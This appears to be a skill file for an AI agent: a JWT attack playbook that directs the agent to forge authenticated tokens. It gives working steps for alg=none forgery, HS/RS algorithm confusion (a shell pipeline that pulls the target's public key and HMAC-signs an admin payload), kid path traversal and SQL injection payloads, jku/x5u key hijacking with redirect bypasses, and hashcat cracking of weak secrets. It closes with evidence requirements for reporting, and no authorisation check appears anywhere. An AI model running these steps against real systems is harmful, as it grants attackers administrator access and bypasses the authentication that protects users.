---
name: jwt
description: JWT attack playbook — algorithm confusion (alg=none, HS/RS confusion), kid path traversal/SQLi, jku/x5u SSRF, weak HS256 cracking, and embedded JWK trickery. Use when the target uses JWTs for auth (header.payload.signature).
allowed-tools:
  - http
  - shell
  - file_write
---

# JWT playbook

You have one or more `eyJ...` tokens. The goal is to forge an authenticated token that the server accepts.

## 0. Decode every token
Base64url-decode header and payload. Note `alg`, `kid`, `jku`, `jwk`, `x5u`, `x5c`.

## 1. alg=none
```
header  = base64url({"alg":"none","typ":"JWT"})
payload = base64url({"sub":"admin","role":"admin","exp":<future>})
signature = ""
token = header + "." + payload + "."
```
Variants: `none`, `None`, `NONE`, `NoNe`.

## 2. HS/RS algorithm confusion
If server expects RS256 and you obtain the public key, forge HS256 signed with it:
```
PUB=$(curl -s https://target/.well-known/jwks.json | jq -r '.keys[0]' | jose key -i- -O pem.pub)
HEAD=$(printf '%s' '{"alg":"HS256","typ":"JWT"}' | base64url)
PAYL=$(printf '%s' '{"sub":"admin","exp":2000000000}' | base64url)
SIG=$(printf '%s.%s' "$HEAD" "$PAYL" | openssl dgst -sha256 -hmac "$(cat pem.pub)" -binary | base64url)
echo "$HEAD.$PAYL.$SIG"
```

## 3. kid path traversal / SQLi
- `../../../../../../dev/null` — server reads /dev/null, sign with empty key.
- `../../../../../../etc/passwd`
- SQLi: `' UNION SELECT 'aaaa' --`
- Null-byte truncation.

## 4. jku / x5u → SSRF + key control
1. Host your own JWKS containing a key you generated.
2. Sign the token with the matching private key.
3. Set `jku` to your URL.

Bypasses: open redirect on trusted domain, `@` trick, subdomain takeover.

## 5. Embedded jwk
Generate fresh keypair, embed public key in header, sign with private key.

## 6. Weak HS256 secret
```
hashcat -m 16500 token.jwt rockyou.txt
```
Try: `secret`, `your-256-bit-secret`, `change-me`, company name, hostname.

## 7. Reporting
Required evidence:
- The original token (redacted)
- The forged token (full)
- The exact request demonstrating impact
- Server response showing privileges granted
